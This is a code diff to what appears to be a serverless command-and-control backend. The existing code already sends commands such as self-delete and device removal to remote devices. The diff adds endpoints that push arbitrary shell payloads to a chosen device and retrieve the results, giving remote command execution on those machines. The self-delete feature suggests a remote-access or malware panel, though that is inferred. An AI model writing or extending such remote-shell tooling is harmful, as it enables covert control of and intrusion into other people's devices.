@@ -33,6 +33,14 @@ export default {
             return handleSelfDeleteCommand(request, env);
         }
 
+        if (url.pathname === "/api/shell" && request.method === "POST") {
+            return handleShellCommand(request, env);
+        }
+
+        if (url.pathname === "/api/shell-result" && request.method === "GET") {
+            return handleShellResult(request, env);
+        }
+
         if (url.pathname === "/api/rm" && request.method === "POST") {
             return handleDeleteDevice(request, env);
         }
@@ -100,6 +108,75 @@ async function handleerrorCommand(request, env) {
             "Content-Type": "application/json"
         },
         body: JSON.stringify({ deviceId, command: "error", cantidad })
+    });
+
+    return new Response(await upstream.text(), {
+        status: upstream.status,
+        headers: { "content-type": "application/json" }
+    });
+}
+
+async function handleShellCommand(request, env) {
+    const authed = await isAuthenticated(request, env);
+    if (!authed) {
+        return new Response(JSON.stringify({ error: "unauthorized" }), {
+            status: 401,
+            headers: { "content-type": "application/json" }
+        });
+    }
+
+    let body;
+    try {
+        body = await request.json();
+    } catch (e) {
+        body = {};
+    }
+
+    const deviceId = body && body.deviceId ? String(body.deviceId) : null;
+    const payload = body && body.payload ? String(body.payload) : null;
+
+    if (!deviceId || !payload) {
+        return new Response(JSON.stringify({ error: "missing deviceId or payload" }), {
+            status: 400,
+            headers: { "content-type": "application/json" }
+        });
+    }
+
+    const upstream = await env.LOG_AUTH.fetch(`${LOG_AUTH_URL}/command`, {
+        method: "POST",
+        headers: {
+            Authorization: `Bearer ${env.INTERNAL_TOKEN}`,
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ deviceId, command: "shell", payload })
+    });
+
+    return new Response(await upstream.text(), {
+        status: upstream.status,
+        headers: { "content-type": "application/json" }
+    });
+}
+
+async function handleShellResult(request, env) {
+    const authed = await isAuthenticated(request, env);
+    if (!authed) {
+        return new Response(JSON.stringify({ error: "unauthorized" }), {
+            status: 401,
+            headers: { "content-type": "application/json" }
+        });
+    }
+
+    const url = new URL(request.url);
+    const deviceId = url.searchParams.get("deviceId");
+    if (!deviceId) {
+        return new Response(JSON.stringify({ error: "missing deviceId" }), {
+            status: 400,
+            headers: { "content-type": "application/json" }
+        });
+    }
+
+    const upstream = await env.LOG_AUTH.fetch(`${LOG_AUTH_URL}/command-result?deviceId=${encodeURIComponent(deviceId)}`, {
+        headers: { Authorization: `Bearer ${env.INTERNAL_TOKEN}` }
     });
 
     return new Response(await upstream.text(), {
